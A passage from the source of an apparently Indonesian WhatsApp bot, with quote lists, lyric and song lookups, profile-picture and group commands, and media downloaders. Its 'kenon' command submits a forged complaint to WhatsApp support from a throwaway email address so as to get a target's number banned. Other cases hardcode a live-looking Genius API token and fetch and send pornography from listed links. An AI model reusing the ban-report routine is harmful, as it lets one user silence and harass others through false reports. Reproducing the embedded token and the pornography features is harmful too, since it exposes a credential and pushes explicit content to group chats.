    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Denzytruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${Denzytruth}`)
}
break
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
case 'aksarasunda': {
   if (!text) return m.reply("Example: .aksarasunda apip")

const latinToSundanese = {
  'a': 'ᮅ',
  'b': 'ᮘ',
  'c': 'ᮎ',
  'd': 'ᮓ',
  'e': 'ᮌ',
  'f': 'ᮕ',
  'g': 'ᮎ',
  'h': 'ᮠ',
  'i': 'ᮄ',
  'j': 'ᮏ',
  'k': 'ᮊ',
  'l': 'ᮜ',
  'm': 'ᮙ',
  'n': 'ᮔ',
  'o': 'ᮇ',
  'p': 'ᮕ',
  'q': 'ᮃ',
  'r': 'ᮛ',
  's': 'ᮞ',
  't': 'ᮒ',
  'u': 'ᮅ',
  'v': 'ᮗ',
  'w': 'ᮝ',
  'x': 'ᮞ',
  'y': 'ᮌ',
  'z': 'ᮚ',
  ' ': ' '
};

async function convertToSundanese(text) {
  return [...text.toLowerCase()]
    .map(char => latinToSundanese[char] || char) 
    .join('');
}

const kntlsundaa = await convertToSundanese(text)
await Denzy.sendMessage(m.chat, {text: `${kntlsundaa}` }, {quoted: qkontak})
}
break
case "addprem": {
if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./start/lib/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break
case 'delprem': {
    if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    if (args.length < 1) return m.reply(`Use :\n*#delprem* @tag\n*#delprem* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./start/lib/database/premium.json", JSON.stringify(premium));
        }
        m.reply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("./start/lib/database/premium.json", JSON.stringify(premium));
        m.reply("Success");
    }
}
break
case 'findsong': {
    const fetch = require('node-fetch');
    if (!args[0]) return reply('Masukkan beberapa kata dari lirik lagu.');

    const query = args.join(' '); 
    const apiKey = 'P3QcawG2xePU7sIxOD-4KeVMU-2mti77t6RHbo93q84Xon8hvKniFYDpphcA1kjckDXBnhdnh5spgGzpB_EQgw'; 
    const url = `https://api.genius.com/search?q=${encodeURIComponent(query)}&access_token=${apiKey}`;

    try {
        const response = await fetch(url);
        const data = await response.json();

        if (!data.response.hits.length) return reply('Lagu tidak ditemukan berdasarkan lirik tersebut.');

        const song = data.response.hits[0].result; 
        const caption = `
🎵 *Lagu Ditemukan!*
▢ *Judul*: ${song.title}
▢ *Artis*: ${song.primary_artist.name}
▢ *URL*: ${song.url}
        `.trim();
        if (song.song_art_image_url) {
            await kyy.sendMessage(m.chat, { image: { url: song.song_art_image_url }, caption }, { quoted: qkontak });
        } else {
            reply(caption);
        }
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mencari lagu. Coba lagi nanti.');
    }
}
break;
case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Denzy.downloadAndSaveMediaMessage(quoted)
			let botNumber = await Denzy.decodeJid(Denzy.user.id)
			let { img } = await pepe(media)
			await Denzy.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			Reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			Reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		Reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//==================================================================
case 'setpppgcanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Denzy.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await Denzy.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} telah mengganti Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			Reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		Reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
            case 'lirik':
            case 'lyrics': {
if (!text) return Reply(`Lirik apa yang Anda cari?\nContoh penggunaan: ${prefix}lyrics Thunder`)
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
const hasil = await fetchJson(`https://api.vreden.web.id/api/lirik?lagu=${encodeURIComponent(text)}`)
const xeonlirik = `
*Lyrics :* ${hasil.result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namaBot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./Denzy.jpg')}, { upload: Denzy.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363415603332542@newsletter',
                  newsletterName: "Slnc Denzy",
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: fvn })
return Denzy.relayMessage(m.chat, msgs.message, {})
}
break
case 'antitaggc': {
    if (!m.isGroup) return Reply("Grup Only")
    if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    if (m.message?.groupStatusMentionMessage) {
        Reply(`[ ! ] Jangan Tag Grup Ini Kontol`)
        await Denzy.sendMessage(m.chat, { delete: m.key })
    }
    return true
}
break
case 'add': case 'invite': {
	if (!m.isGroup) return Reply("Grup Only")
	if (!isBotAdmins) return Reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!text) return Reply(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix + command}* 6285167249152`)
if (text.includes('+')) return Reply(`Enter the number together without *+*`)
if (isNaN(text)) return Reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Denzy.groupInviteCode(group)
      await Denzy.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        Reply(` An invite link is sent to the user`) 
}
break
case 'xnxxdl': {
	if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
	if (!text) return Reply(`Enter Url`)
        if (!text.includes('xnxx.com')) return Reply(`Enter an xnxx link`)
        Reply("cocote")
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
            console.log(xn)
Denzy.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Judul*: ${xn.title}
▢ *🗂️ Size*: ${xn.size}
▢ *⌚Duration* ${xn.ruration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
	if (!text) return Reply(`Enter Query`)
	Reply("cocote")
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) Reply(ff)
              }
              break
              case 'genshin':
if (!text) return Reply(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Versi:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://endpoint.web.id/search/genshin-character?key=makima/${a}/portrait`
await Denzy.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return Reply('Error')
}
break

case 'kenon': {
if (!isDenzyCreator) return reply('Fitur ini hanya dapat digunakan oleh owner.')
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Saya perhatikan ada pengguna yang menggunakan whatsapp yang dimodifikasi, jadi saya meminta dukungan untuk memblokir akun ini karena melanggar persyaratan layanan, dan akun tersebut menggunakan bot WhatsApp yang dapat mengirim pesan jahat sehingga WhatsApp pengguna lain tidak dapat berfungsi.
Nomor : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Denzy🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'waifu1' :
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
Denzy.sendMessage(from, {image: {url:waifudd.data.url},caption:`Dasar Wibu`}, { quoted: qkontak }).catch(err => {
 return('Error!')
})
break
/// download
case 'sspotify': {
    if (!text) return m.reply(`Masukkan judul lagu yang ingin Anda cari, Contoh: ${prefix + command} gala bunga mataharia`);
    
    m.reply('tunggu sebentar..'); 
    
    try {
        let response = await axios.get(`https://fgsi-spotify.hf.space/query=${encodeURIComponent(text)}`);
        let data = response.data;

        if (!data.status) return m.reply(`Error: ${data.msg}`);

        let { title, artist, duration, popularity, preview, thumbnail: thumbnailUrl, url } = data.result;
        let audioUrl = data.audio.url;

        const thumbnails = await axios.get(thumbnailUrl, { responseType: 'arraybuffer' });
        const thumbnail = Buffer.from(thumbnails.data, 'binary');

        await Denzy.sendMessage(m.chat, {
            image: thumbnail,
            caption: `🎵 *${title}*\n👤 *Artist:* ${artist}\n⏳ *Duration:* ${duration}\n✨ *Rate Song:* ${popularity}\n📌 *Preview:* ${preview || "No preview available"}\n🔗 *Spotify Link:* ${url}`,
        }, { quoted: qkontak });

        await Denzy.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
        }, { quoted: qkontak });

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil lagu dari spotify.");
    }
}
break
case 'snackvideo':{
 const cheerio = require('cheerio');
if (!text) return m.reply(`Linknya mana??`)
async function downloadSnackVideo(url) {
 return new Promise(async (resolve, reject) => {
 try {
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);
 let result = {
 metadata: {},
 download: null
 };
 const json = JSON.parse($("#VideoObject").text().trim());
 result.metadata.title = json.name;
 result.metadata.thumbnail = json.thumbnailUrl[0];
 result.metadata.uploaded = new Date(json.uploadDate).toLocaleString();
 result.metadata.comment = json.commentCount;
 result.metadata.watch = json.interactionStatistic[0].userInteractionCount;
 result.metadata.likes = json.interactionStatistic[1].userInteractionCount;
 result.metadata.share = json.interactionStatistic[2].userInteractionCount;
 result.metadata.author = json.creator.mainEntity.name;
 result.download = json.contentUrl;
 resolve(result);
 } catch (error) {
 reject({ msg: error.message });
 }
 });
}
try {
const result = await downloadSnackVideo(text);
let message = `🎥 Nihh hasil download darii SnackVideo kamuu !! 🎉

✨ Judul Video : ${result.metadata.title} ✨
👀 Jumlah Tonton : ${result.metadata.watch} 👀
👤 Darii : ${result.metadata.author} 👤`

Denzy.sendMessage(m.chat,{
video : { url : result.download },
caption : message
 })
} catch (err) {
console.error(err);
Reply("Error :(")}
}
break
case 'play': 
case 'ytplay': {
if (!text) return reply(`Example: ${prefix + command} Lagu sad`);
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
try {		
let search = await yts(`${text}`);
if (!search || search.all.length === 0) return reply(`*Lagu tidak ditemukan!* ☹️`);
let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`;
Denzy.sendMessage(m.chat,{
image: { url: image },
caption: caption,
footer: `${global.namaOwner}`,
buttons: [
{
buttonId: `${prefix}play1 ${text}`,
buttonText: {
displayText: "YouTube Music"
}
},
{
buttonId: `${prefix}ytmp4 ${url}`,
buttonText: {
displayText: "YouTube Video"
}
}
],
viewOnce: true,
}, {
quoted: m
});
} catch (err) {
console.error(err);
reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
}
}
break
case 'bokep': {
Denzy.sendMessage(m.chat, {  text: `Silahkah Pilih *BOKEP* Yang Tersedia Di Bawah Ini  `, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIST BOKEP',
          sections: [
            {
              title: 'LIST BOKEP',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'BOKEP 1',
                  id: `.vdy https://videy.co/v?id=cFmHXLnR1`
                },
                {
                  title: 'BOKEP 2',
                  id: `.vdy https://videy.co/v?id=IZ2dEEPR1`
                },                
                {
                title: 'BOKEP 3',
                  id: `.vdy https://videy.co/v?id=taEdfX521`
                },                
                {
                title: 'BOKEP 4',
                  id: `.vdy https://videy.co/v?id=yUI9qHxy1`
                },                
                {
                title: 'BOKEP 5',
                  id: `.vdy https://videy.co/v?id=VkhX0rIY1`
                },                
                {
                  title: 'BOKEP 6',
                  id: `.vdy https://videy.co/v?id=HbciV3Ng1`
                },                
                {
                title: 'BOKEP 7',
                  id: `.vdy https://videy.co/v?id=Yep64SD61`
                },                
                {
                title: 'BOKEP 8',
                  id: `.vdy https://videy.co/v?id=bliIEHfL1`
                },                
                {
                title: 'BOKEP 9',
                  id: `.vdy https://videyvideo.short.gy/Cwdcj1`
                },                
                {
                  title: 'BOKEP 10',
                  id: `.vdy https://videy.co/v?id=a1Uim8Ey`
                },                
                {
                title: 'BOKEP 11',
                  id: `.vdy https://videy.co/v?id=LevNyK2x1`
                },                
                {
                title: 'BOKEP 12',
                  id: `.vdy https://videy.co/v?id=jRlBDROc1`
                },                
                {
                title: 'BOKEP 13',
                  id: `.vdy https://videy.co/v?id=kxx94sEr1`
                },                
                {
                  title: 'BOKEP 14',
                  id: `.vdy https://videy.co/v?id=ji0jr2f71`
                                  },                
                {
                title: 'BOKEP 15',
                  id: `.vdy https://videy.co/v?id=vApGwZAC1`
                },                
                {
                title: 'BOKEP 16',
                  id: `.vdy https://videy.co/v?id=UdqYuonc1`
                },                
                {
                title: 'BOKEP 17',
                  id: `.vdy https://videy.co/v?id=KTw1lWWa1`
                },                
                {
                  title: 'BOKEP 18',
                  id: `.vdy https://videy.co/v?id=5JeZNWaH1`
                                  },                
                {
                title: 'BOKEP 19',
                  id: `.vdy https://videy.co/v?id=99FZhvO21`
                },                
                {
                title: 'BOKEP 20',
                  id: `.vdy https://videy.co/v?id=iDZaNE341`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  }, { quoted: qkontak });
}
break
case 'vdy':{
if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    if (!text) return reply("Masukkan Link Videy")
    if (!text.includes('videy')) return reply("Itu Bukan Link Videy")
    await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    try {
        let anu = await fetchJson(`https://api.agatz.xyz/api/videydl?url=${text}`);
        let anu1 = anu.data;
